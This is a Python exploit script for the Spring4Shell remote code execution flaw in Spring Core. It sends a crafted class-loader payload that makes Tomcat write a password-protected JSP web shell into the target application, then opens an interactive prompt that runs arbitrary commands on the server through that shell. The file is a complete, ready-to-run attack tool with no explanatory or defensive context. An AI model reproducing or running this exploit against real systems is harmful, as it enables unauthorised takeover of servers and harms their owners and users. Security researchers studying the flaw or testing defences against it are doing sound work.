#coding:utf-8

import requests, argparse, sys, urllib3
from urllib.parse import urljoin

urllib3.disable_warnings()

def Exploit(url, dir):
    headers = {"suffix":"%>//",
        "c1":"Runtime",
        "c2":"<%",
        "DNT":"1",
        "Content-Type":"application/x-www-form-urlencoded"
        }
    data = f"class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bc2%7Di%20if(%22pwned%22.equals(request.getParameter(%22pwd%22)))%7B%20java.io.InputStream%20in%20%3D%20%25%7Bc1%7Di.getRuntime().exec(request.getParameter(%22cmd%22)).getInputStream()%3B%20int%20a%20%3D%20-1%3B%20byte%5B%5D%20b%20%3D%20new%20byte%5B2048%5D%3B%20while((a%3Din.read(b))!%3D-1)%7B%20out.println(new%20String(b))%3B%20%7D%20%7D%20%25%7Bsuffix%7Di&class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp&class.module.classLoader.resources.context.parent.pipeline.first.directory={dir}&class.module.classLoader.resources.context.parent.pipeline.first.prefix=spring4shell&class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat="
    try:
        shellurl = urljoin(url, 'spring4shell.jsp')
        requests.post(url,headers=headers,data=data,timeout=15,allow_redirects=False, verify=False)
        shellgo = requests.get(f"{shellurl}?pwd=pwned&cmd=",timeout=15,allow_redirects=False, verify=False)
        if shellgo.status_code == 200:
            print(f"Exploit succeded，Visit: {url}spring4shell.jsp?pwd=pwned&cmd=id")
            try:
                while True:
                    cmd = input("cmd > ")
                    if cmd == "exit" or cmd == "quit":
                        sys.exit()
                    while True:
                        r = requests.get(f"{shellurl}?pwd=pwned&cmd={cmd}",timeout=15,allow_redirects=False,verify=False)
                        if r.text == '':
                            continue
                        else:
                            break
                    if r.status_code != 200:
                        continue
                    res = r.text.replace("- if(\"pwned\".equals(request.getParameter(\"pwd\"))){ java.io.InputStream in = -.getRuntime().exec(request.getParameter(\"cmd\")).getInputStream(); int a = -1; byte[] b = new byte[2048]; while((a=in.read(b))!=-1){ out.println(new String(b)); } } -\n","").replace('\0', '')
                    print(res[0:res.find("//")][:-2])
            except KeyboardInterrupt:
                sys.exit()
        else: 
            print("Something went wrong")
            print ("status code : " + str(shellgo.status_code))
    except Exception as e:
        print(e)
        pass

def main():
    parser = argparse.ArgumentParser(description='Srping-Core Rce.')
    parser.add_argument('--url',help='Target URL',required=True)
    parser.add_argument('--dir', help='Directory of target app. Suggest using "webapps/[appname]"', required=False, default="webapps/ROOT")
    args = parser.parse_args()
    if args.url:
        Exploit(args.url, args.dir)
   
if __name__ == '__main__':
    main()
